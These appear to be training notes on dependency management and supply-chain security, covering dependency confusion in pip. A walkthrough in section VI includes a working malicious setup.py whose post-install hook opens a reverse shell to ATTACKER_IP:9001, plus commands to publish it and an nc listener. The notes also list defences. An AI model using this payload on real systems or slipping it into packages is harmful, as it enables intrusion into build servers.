## I. Understanding Dependencies

- **Definition:**  
  - **Dependencies** are external or internal libraries and modules that your application uses to perform tasks.
  
- **The Scale of Dependencies:**  
  - *Example:* A simple Python file importing NumPy may contain a single import statement, but behind the scenes, thousands of lines of code (from many smaller modules) are executed.
  - Your own code might represent only **0.01%** of the overall code running in your application.

---

## II. The Role & Importance of Dependency Management

- **Process Overview:**  
  - Involves tracking, version-locking, and securing all libraries used throughout the Software Development Lifecycle (SDLC) and DevOps pipelines.

- **Key Reasons to Manage Dependencies:**  
  - **Support & Maintenance:** Easier troubleshooting and upgrades when you know exactly what libraries are in use.
  - **Stability:** Version locking prevents unexpected behavior from breaking your app.
  - **Deployment Efficiency:** Pre-packaged dependencies (golden images) speed up deployments.
  - **Onboarding:** New developers can set up their environments quickly with a known list of dependencies.
  - **Security:** Regular monitoring and patching help protect against disclosed vulnerabilities.

## III. Classifications: Internal vs. External Dependencies

- **External Dependencies:**  
  - **Definition:** Modules maintained outside your organization (e.g., Python packages from PyPi, NPM libraries like jQuery or VueJS).  
  - **Real-Life Example:**  
    - Importing `numpy` brings in an entire ecosystem of sub-modules maintained by the wider community.
  - **Security Consideration:**  
    - These often come with public vulnerabilities (CVEs) and unpredictable patch cycles.

- **Internal Dependencies:**  
  - **Definition:** Libraries developed in-house to standardize specific functionality (like authentication or data connection).  
  - **Real-Life Example:**  
    - A custom authentication library used across your organization’s applications.
  - **Security Consideration:**  
    - Requires active maintenance and controlled access (especially to avoid unauthorized modifications).

---

## IV. Securing External Dependencies

- **Key Vulnerabilities:**  
  - **Public CVEs:** Vulnerabilities become public once patches are issued, leaving a time window for exploitation.
  - **Supply Chain Attacks:** Attackers target dependencies rather than the application directly.  
    - *Real-Life Example:* The **Log4j** vulnerability allowed remote code execution in countless Java applications.

- **Attack Scenario – Supply Chain Injection (JS Example):**  
  - A misconfigured S3 bucket allowed world-write permissions.  
  - An attacker:
    - Modifies a **JavaScript** file (e.g., `auth.js`) to include malicious code (a credential skimmer).
    - Uses tools like `curl` to upload the altered dependency.
    - Sets up a local Python server to capture intercepted credentials.

- **Defensive Measures:**  
  - **Regular Patching:** Update dependencies as soon as vulnerabilities emerge.
  - **Internal Hosting:** Copy dependencies internally to limit your exposure.
  - **Subresource Integrity:** Include cryptographic hashes in HTML to verify that externally hosted scripts haven’t been tampered with.

## V. Securing Internal Dependencies

- **Characteristics:**  
  - Developed and maintained inside the organization.
  - Aim to standardize processes (e.g., authentication libraries or data connectors).

- **Security Challenges:**  
  - They can quickly become legacy code if the original maintainers move on.
  - Multiple applications using the same dependency raise the impact of any vulnerability.
  - Must restrict write (and sometimes even read) access to limit modification risks.

- **Tools & Best Practices:**  
  - **Internal Repositories:** Use an internal PyPi server or tools like **JFrog Artifactory**.
  - **Central Management:** Integrate dependency management with your DevOps pipeline.
  - **Access Control:** Protect the code base by strictly managing permissions.

## VI. Dependency Confusion: Theory & Exploitation

- **What is Dependency Confusion?**  
  - A vulnerability identified in 2021 by Alex Birsan.
  - Occurs when an internal dependency is unintentionally overridden by a malicious package from an external repository.
  
- **How It Happens:**  
  - Developers may configure pip with an extra index URL (for internal packages).  
  - Pip scans both the internal and external repositories, picks the package with the highest version number.
  - An attacker publishes a similarly named package externally with a higher version (e.g., using version **9000**).

## Dependency Confusion Attack: Quick Overview

- **Goal:** Trick a build server into installing a malicious package over an internal one by exploiting pip’s version resolution (highest version wins).


### Steps to Exploit

#### 1. Identify the Target
- **Internal Package Name:**  
  - E.g., `datadbconnect` (revealed by internal discussions or configuration).
- **Attack Strategy:**  
  - Create a malicious package with the same name but a much higher version (e.g., v9000.0.3).

#### 2. Create the Malicious Package

- **Directory Structure:**
  - `datadbconnect/`
    - `datadbconnect/__init__.py` (can be empty)
    - `setup.py`

- **Key `setup.py` Code:**
  
  ```python
  from setuptools import setup, find_packages
  from setuptools.command.install import install
  import os

  VERSION = "v9000.0.3"  # Higher than the internal version

  class MaliciousInstall(install):
      def run(self):
          install.run(self)
          print("Triggering reverse shell...")
          # Replace ATTACKER_IP and port with your listener's details.
          os.system(
              'python -c "import socket,subprocess,os;'
              's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
              's.connect((\'ATTACKER_IP\',9001));'
              'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);'
              'subprocess.call([\'/bin/sh\', \'-i\'])"'
          )

  setup(
      name="datadbconnect",
      version=VERSION,
      packages=find_packages(),
      cmdclass={'install': MaliciousInstall},
  )
  ```

- **Note:** The post-install hook in the malicious package immediately executes the reverse shell code when installed.

#### 3. Build and Publish
- **Build Package:**
  
  ```bash
  python3 setup.py sdist
  ```

- **Publish to Simulated External Repository:**
  
  ```bash
  twine upload dist/datadbconnect-v9000.0.3.tar.gz --repository-url http://external.pypi-server.loc:PORT
  ```

#### 4. Trigger the Exploit on the Build Server
- **Server Setup:**  
  - The build server’s pip command includes both the internal index and an extra index:
  
    ```bash
    pip install datadbconnect --no-cache-dir --trusted-host internal.pypi-server.com --extra-index-url "http://internal.pypi-server:8081/simple/"
    ```

- **Outcome:**  
  - Because the malicious version (v9000.0.3) is higher, pip installs it.
  - The post-install hook fires, initiating a reverse shell connection.

- **Listener Command (on Attacker's Machine):**
  
  ```bash
  nc -lvp 9001
  ```

---

### Real-Life Implications
- **Practical Impact:**  
  - An attacker gains shell access to the build server during an automated dependency installation.
- **Defense Tips:**  
  - Use a strict internal-only index (`--index-url` instead of `--extra-index-url`).
  - Pre-register critical internal package names on public repositories.
  - Enforce integrity checks (e.g., subresource integrity) to verify downloads.

## VII. Best Practices & Real-World Considerations

- **General Principles:**
  - **Vigilance:** Constantly monitor, update, and secure all dependencies.
  - **Least Privilege:** Restrict access rights to the minimum necessary.
  - **Verification:** Use checksums and controlled repositories to ensure integrity.
  
- **Everyday Examples:**  
  - A developer using a simple `pip install numpy` may unwittingly run tens of thousands of lines of external code.
  - A misconfigured cloud storage bucket could allow an attacker to overwrite a widely used JavaScript library, leading to mass credential harvesting.
  - Dependency confusion in a Python project might let an attacker inject a reverse shell during the CI/CD pipeline execution.
